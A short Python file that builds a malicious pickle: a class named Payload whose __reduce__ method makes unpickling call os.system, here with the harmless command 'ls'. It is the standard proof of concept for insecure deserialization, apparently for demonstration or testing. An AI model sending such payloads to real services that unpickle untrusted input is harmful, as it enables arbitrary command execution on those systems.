import pickle
import os

class Payload(object):
    def __reduce__(self):
        return os.system, ('ls',)

def makePickleData(payload: Payload):
    return pickle.dumps(payload)